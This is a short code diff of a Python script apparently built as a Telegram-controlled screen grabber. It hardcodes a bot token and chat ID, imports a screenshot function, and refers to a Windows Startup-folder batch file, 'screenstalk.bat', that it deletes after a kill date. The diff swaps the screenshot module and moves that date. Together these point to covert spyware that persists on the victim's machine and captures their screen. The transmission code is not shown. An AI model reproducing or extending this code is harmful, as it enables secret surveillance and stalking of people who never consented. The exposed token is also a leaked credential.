@@ -1,11 +1,11 @@
 import telebot;
 from telebot import types;
 import time;
-from screenshot import get_screenshots_bytes
+#from screenshot import get_screenshots_bytes
+from shotscreen import get_screenshots_bytes
 import datetime;
 import os;
 import getpass
-import shutil
 from sys import argv
 
 
@@ -13,7 +13,7 @@ bot = telebot.TeleBot("6182954429:AAFhs3NF6Diynl2lFBzNvJGpwtTd9GGshMs")
 chatid = -849718605
 USER_NAME = getpass.getuser()
 def screengrab():
-  if datetime.datetime.now() >= datetime.datetime(2023, 6, 16):
+  if datetime.datetime.now() >= datetime.datetime(2023, 6, 17):
     print('deleted')
     startup_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\screenstalk.bat' % USER_NAME
     os.remove(startup_path)
